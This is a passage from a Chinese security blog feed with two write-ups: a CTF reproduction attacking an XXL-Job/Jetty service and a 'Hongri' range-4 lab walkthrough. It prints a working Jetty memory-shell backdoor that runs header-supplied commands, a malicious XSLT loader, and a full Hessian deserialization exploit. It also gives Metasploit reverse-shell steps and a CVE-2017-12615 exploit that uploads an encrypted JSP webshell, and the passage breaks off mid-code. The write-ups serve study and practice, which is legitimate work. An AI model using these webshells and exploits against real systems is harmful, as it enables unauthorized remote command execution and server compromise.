                       cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>                    &#125;<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\ASADSADASDSADAS&quot;</span>).next();<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(result.getBytes());<br>                    outputStream.flush();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;godzilla&quot;</span>)) &#123;<br>                <span class="hljs-comment">// 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题</span><br>                <span class="hljs-type">byte</span>[] data = base64Decode(request.getParameter(pass));<br>                data = x(data, <span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[<span class="hljs-number">0</span>], Thread.currentThread().getContextClassLoader());<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">defMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>                    defMethod.setAccessible(<span class="hljs-literal">true</span>);<br>                    payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="hljs-number">0</span>, data.length);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();<br>                    f.equals(arrOut);<br>                    f.equals(data);<br>                    f.equals(request);<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>).getBytes());<br>                    f.toString();<br>                    outputStream.write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)).getBytes());<br>                    outputStream.write(md5.substring(<span class="hljs-number">16</span>).getBytes());<br>                    outputStream.flush();<br>                    <span class="hljs-keyword">return</span> ;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译一下转成base64放到xslt文件里面去，最终的恶意xslt如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;com.xxl.job.core.JettyGodzillaMemshell&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里一定要记得defineClass的类名要改啊，不然就报错了，一开始忘改了打了好久都没通😭，然后去前面试了一下api的未授权，也是没写对类名导致的😭浪费我好多时间</p></blockquote><p>然后就是一把梭payload打一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//发送post请求，因为Hessian要发送原生的序列化数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//创建url对象</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// 设置请求方法为 POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// 设置请求头</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// 允许输出</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//设置请求体</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// 获取响应码</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// 关闭连接</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//去修改这里写入的文件名，以及文件内容</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//解析xslt文件生效</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172043678.png" alt="image-20241128172043678"></p><p>然后请求头x-fuck-data为cmd时就可以直接任意命令了</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-fuck-data</span><span class="hljs-punctuation">: </span>cmd<br><span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>ls /<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172129357.png" alt="image-20241128172129357"></p><p>想用哥斯拉去连接的，但是连不上不知道为什么</p><p>想试一下冰蝎马的，但是打进去连不上不知道为什么，不知道是不是和Handler的机制有关，Jetty这块还不太熟，有机会再研究</p><h1 id="参考"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/ph4nt0mer/p/13913252.html">https://www.cnblogs.com/ph4nt0mer/p/13913252.html</a></p><p><a href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></p><p><a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p><a href="https://blog.csdn.net/2301_79724395/article/details/141229224">https://blog.csdn.net/2301_79724395/article/details/141229224</a></p><p>官方wp：<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;由于题目是公共靶机现在已经挂了，所以复现需要自己搭建题目环境&lt;/p&gt;
&lt;p&gt;跟着这篇文章来配置一下：&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场四</title>
    <link href="https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
    <id>https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</id>
    <published>2024-11-15T14:00:56.000Z</published>
    <updated>2024-11-16T15:05:14.349Z</updated>
    
    <content type="html"><![CDATA[<p>因为兼容性已经似了两个靶场，求求你别似了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>两张网卡，一张VMnet0和VMnet1都是仅主机模式</p><p><img src="https://cdn.clown2024.cn/image-20241115220741988.png" alt="image-20241115220741988"></p><p><strong>web靶机</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221245366.png" alt="image-20241115221245366"></p><p><strong>win7</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221326010.png" alt="image-20241115221326010"></p><p><strong>DC</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221401258.png" alt="image-20241115221401258"></p><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="https://cdn.clown2024.cn/image-20241115221119472.png" alt="image-20241115221119472"></p><p>我们启动之后要去web靶机里面启动三个容器服务</p><p><img src="https://cdn.clown2024.cn/image-20241115222514020.png" alt="image-20241115222514020"></p><p>我们启动前三个容器服务即可</p><p>然后我们的攻击机自然也要在VMnet0的网段</p><blockquote><p>好欸靶机终于活了一次了😭</p></blockquote><h2 id="机器密码"><a href="#机器密码" class="headerlink" title="机器密码"></a>机器密码</h2><ul><li>ubuntu:ubuntu <strong>域成员机器</strong></li><li>douser:Dotest123 <strong>DC</strong></li><li>administrator:Test2008（改成 Admin123 因为过期了）</li></ul><h1 id="考点描述"><a href="#考点描述" class="headerlink" title="考点描述"></a>考点描述</h1><p>本次靶场渗透<strong>反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透</strong>等多种组合漏洞</p><p><strong>靶场学习路径，可参考</strong></p><ul><li>st漏洞利用</li><li>phpmyadmin getshell</li><li>tomcat 漏洞利用</li><li>docker逃逸</li><li>ms14-068</li><li>ssh密钥利用</li><li>流量转发</li><li>历史命令信息泄露</li><li>域渗透</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>先用arp-scan扫一下同一网段内的主机，指定对应的网卡接口</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -I eth1 -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115223747881.png" alt="image-20241115223747881"></p><p>那可以得知192.168.157.128就是我们的外网web靶机</p><p>接下来用nmap进行端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sT -sV 192.168.157.128<br></code></pre></td></tr></table></figure><p>扫出来下面的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:39 EST<br>Nmap scan report for 192.168.157.128<br>Host is up (0.0013s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>2001/tcp open  http    Jetty 9.2.11.v20150529<br>2002/tcp open  http    Apache Tomcat 8.5.19<br>2003/tcp open  http    Apache httpd 2.4.25<br>MAC Address: 00:0C:29:E3:C5:36 (VMware)<br>Service Info: Host: 172.19.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds<br></code></pre></td></tr></table></figure><p>可以看到三个开放端口都有服务，2001、2002、2003，22的ssh服务一般先跳过</p><p>然后上fscan扫一下漏洞吧</p><p>都能扫出来相关的漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.157.128:2002 open<br>192.168.157.128:2001 open<br>192.168.157.128:2003 open<br>[*] alive ports len is: 3<br>start vulscan<br>[*] WebTitle http://192.168.157.128:2002 code:200 len:11230  title:Apache Tomcat/8.5.19<br>[*] WebTitle http://192.168.157.128:2001 code:200 len:1077   title:Struts2 Showcase - Fileupload sample<br>[+] PocScan http://192.168.157.128:2002 poc-yaml-iis-put-getshell <br>[+] PocScan http://192.168.157.128:2002 poc-yaml-tomcat-cve-2017-12615-rce        <br>[+] PocScan http://192.168.157.128:2001 poc-yaml-struts2_045 poc1<br></code></pre></td></tr></table></figure><blockquote><p>不是他怎么2003端口没扫出来洞呢🤔，这按理来说应该是有的吧</p></blockquote><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="tomcat任意文件写入漏洞"><a href="#tomcat任意文件写入漏洞" class="headerlink" title="tomcat任意文件写入漏洞"></a>tomcat任意文件写入漏洞</h2><p>那就不管了先来看一下他的服务吧，看一下tomcat-cve-2017-12615-rce漏洞，这是一个tomcat的任意文件写入漏洞</p><p>直接用msf搜一下有没有相关的tomcat的cve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search cve-2017 tomcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115230446678.png" alt="image-20241115230446678"></p><p>找到了一个对应的rce漏洞，那就打一下试试</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/http/tomcat_jsp_upload_bypass<br>show payloads<br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.157.129<br><span class="hljs-built_in">set</span> rhost 192.168.157.128<br><span class="hljs-built_in">set</span> rport 2002<br>run<br></code></pre></td></tr></table></figure><p>然后就能弹一个shell回来了</p><p><img src="https://cdn.clown2024.cn/image-20241115230644472.png" alt="image-20241115230644472"></p><p>不过这样操作起来不太方便，去找payload上传一个冰蝎的shell，方便我们后续上传木马</p><p>网上随便找到一个exp：<a href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;纸机&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#验证参数是否完整</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#木马</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#上传木马文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] 目标地址:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] 目标地址:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] 木马上传成功&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 上传失败&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#命令执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span 